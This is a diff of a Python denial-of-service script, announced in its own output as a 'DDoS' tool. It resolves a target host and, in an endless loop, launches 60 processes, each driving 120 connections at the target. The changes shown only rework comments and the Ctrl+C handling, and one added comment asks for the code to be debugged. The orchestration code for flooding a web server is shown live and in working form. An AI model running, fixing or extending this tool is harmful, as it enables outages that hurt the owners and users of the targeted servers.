@@ -32,21 +32,21 @@ def monitor(workers):
     while len(workers) > 10:
         try:
             for worker in workers:
+                # Debug the below code the fix the bug
                 if worker is not None and worker.is_alive():
                     worker.join(1.0)
-
                     print(f"Woker Number - {worker.name} Joined!")
                 else:
-                    # Removing dead workers from workers list
                     workers.remove(worker)
-        except (KeyboardInterrupt, SystemExit):
+        # Except block should only run when keyboard  interruption will happen
+        except KeyboardInterrupt as err:
             print("CTRL+C received. Killing all workers")
             for worker in workers:
                 try:
                     print(f"Killing worker {worker.name}")
                     worker.stop()
                 except Exception:
-                    pass  # silently ignore
+                    pass
 
 
 def main():
@@ -55,22 +55,18 @@ def main():
 
     ip_address = socket.gethostbyname(host)
 
-    # Default number of sockets
     number_of_sockets = 120
 
-    # Defalut number of workers
     number_of_workers = 60
     print("|| DDoS Loaded ||")
 
     print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(
         "GET", number_of_workers, number_of_sockets))
 
-    # SA3.2
     while True:
         try:
             workers = []
             for i in range(number_of_workers):
-                # Define the number of workers here
                 worker = multiprocessing.Process(
                     target=ddos_attack, args=(ip_address, port, number_of_sockets))
                 workers.append(worker)
